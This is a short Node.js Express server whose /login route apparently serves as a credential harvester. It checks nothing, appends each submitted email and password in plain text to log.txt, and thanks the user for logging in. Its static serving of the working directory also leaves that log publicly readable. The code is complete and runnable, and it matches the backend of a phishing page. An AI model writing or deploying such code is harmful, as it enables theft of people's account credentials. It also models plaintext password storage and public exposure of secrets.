const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("."));

app.post("/login", (req, res) => {
  const { email, pass } = req.body;
  const log = `Email: ${email}, Pass: ${pass}\n`;
  fs.appendFileSync("log.txt", log);
  res.send("Thanks for logging in!");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Running on ${PORT}`));
